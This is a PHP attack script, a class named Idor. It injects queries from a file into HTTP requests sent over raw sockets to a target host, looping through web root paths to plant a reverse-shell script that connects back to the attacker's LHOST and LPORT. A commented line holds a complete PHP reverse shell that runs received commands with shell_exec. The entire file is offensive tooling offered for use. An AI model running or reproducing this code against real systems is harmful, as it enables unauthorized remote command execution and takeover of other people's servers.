<?php
class Idor{
    public function init($payload,$host,$master){

        $this->queries=json_decode(file_get_contents("queries.json"), true)["idor"];
        $this->payload=$payload;
        $this->master=$master;
        $this->host=str_replace(' ','',$host);
    }



    public function attack(){
        $stage=0;
        //var_dump($this->queries);
        //socket_connect($this->sock,$this->host,80) or die("\n! unable to reach the server peer :(");
        $script=explode("\n",file_get_contents("scripts/tcp_reverse_shell.php"))[0];
        foreach(explode("\r\n",$this->payload) as $var){
            try{
            if (strpos($var,"formatted")){ $stage++;}
            }catch(exception $error){echo "error";}}
            echo "formatting $stage\n\n\n";
            while (true){
        //$script='<?php $sock=socket_create(AF_INET,SOCK_STREAM,0); $host="127.0.0.1";$port=99999;socket_connect($sock,$host,$port);while (1){socket_write($sock,shell_exec(socket_read($sock,20480)));};
        foreach(explode("\n",file_get_contents("paths.txt")) as $key=>$root){
            $root=str_replace("\r","",$root);
            $i=0;
                foreach($this->queries as $sqlquery){

                        $this->sock=socket_create(AF_INET,SOCK_STREAM,0);
                        socket_connect($this->sock,$this->host,80) or die("\n! unable to reach the server peer :(");
                        $sqlquery=str_replace('LHOST',$this->master[0],str_replace('INDEXPATH',$root,str_replace("SCRIPT",$script,$sqlquery)));
                        $sqlquery=str_replace('LPORT',$this->master[1],$sqlquery);
                        $sqlquery=str_replace("\n","",$sqlquery);
                        $poison=str_replace("formatted".(String) $i,urlencode($sqlquery),$this->payload);
                        echo "edit : $i";
                        $i++;
                        //echo $poison;
                        if ($i==$stage){$i=0;}
                        socket_write($this->sock,$poison);
                            //echo $this->payload."\n\n\n\n\n";
                        //system("curl ".$this->host."/shellindex.php");
                        echo socket_read($this->sock,22024);
                        socket_close($this->sock);
                        //exit;
                        }
    }}
    }


}
?>
